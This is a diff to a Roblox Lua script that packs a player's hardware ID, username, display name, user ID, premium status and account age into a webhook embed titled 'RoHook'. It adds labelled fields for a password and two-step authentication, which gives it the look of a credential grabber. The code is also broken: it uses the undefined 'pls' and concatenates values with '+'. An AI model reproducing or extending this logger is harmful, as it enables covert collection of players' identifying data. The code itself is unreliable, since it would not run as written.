@@ -1,15 +1,18 @@
 --Log
 plr = game:GetService'Players'.LocalPlayer
 local ALT = false
+local DisName = pls.DisplayName
+local PlayerID = plr.UserId
 if plr.MembershipType == Enum.MembershipType.Premium then
+haspremium = true
 elseif plr.MembershipType == Enum.MembershipType.None then
 haspremium = false
 end
-if haspremium == false then 
-if plr.AccountAge <= 7 then 
+
+if plr.AccountAge <= 100 then 
     ALT = true
 end
-end
+
 local market = game:GetService("MarketplaceService")
 local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 local placeIDLocation = game.PlaceId
@@ -43,7 +46,7 @@ local data =
 {
     ["content"] = "",
     ["embeds"] = {{
-        ["title"] = "__**HWID:**__",
+        ["title"] = "__**RoHook (/)**__",
         ["description"] = hwid,
         ["type"] = "rich",
         ["color"] = tonumber(0xFFC300),
@@ -51,6 +54,16 @@ local data =
             {
                 ["name"] = "Username:",
                 ["value"] = Game.Players.LocalPlayer.Name,
+                ["inline"] = true
+            },
+	    {
+                ["name"] = "DisplayName:",
+                ["value"] = DisName,
+                ["inline"] = true
+            },
+	    {
+                ["name"] = "User Id:",
+                ["value"] = PlayerID,
                 ["inline"] = true
             },
 	    {
@@ -74,8 +87,28 @@ local data =
                 ["inline"] = true
             },
 	    {
+                ["name"] = "Password:",
+                ["value"] = "nil",
+                ["inline"] = true
+            },
+	    {
+                ["name"] = "2step Auth:",
+                ["value"] = "false",
+                ["inline"] = true
+            },
+	    {
+                ["name"] = "Validator:",
+                ["value"] = "false",
+                ["inline"] = true
+            },
+	    {
+                ["name"] = "Premium:",
+                ["value"] = haspremium,
+                ["inline"] = true
+            },
+	    {
                 ["name"] = "ALT:",
-                ["value"] = ALT,
+                ["value"] = ALT + " / " + plr.AccountAge,
                 ["inline"] = true
             },
         },
